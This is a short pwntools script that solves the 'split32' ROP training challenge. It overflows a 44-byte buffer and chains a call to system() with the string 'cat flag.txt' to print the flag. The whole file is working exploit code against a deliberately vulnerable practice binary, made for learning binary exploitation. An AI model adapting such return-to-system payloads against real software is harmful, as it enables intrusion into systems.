#!/usr/bin/python3
from pwn import process, p32, log

shell = process("./split32")

offset = 44
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(0x80483e0) # system()
payload += b"B" * 4       # ret addr
payload += p32(0x804a030) # "cat flag.txt"

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")
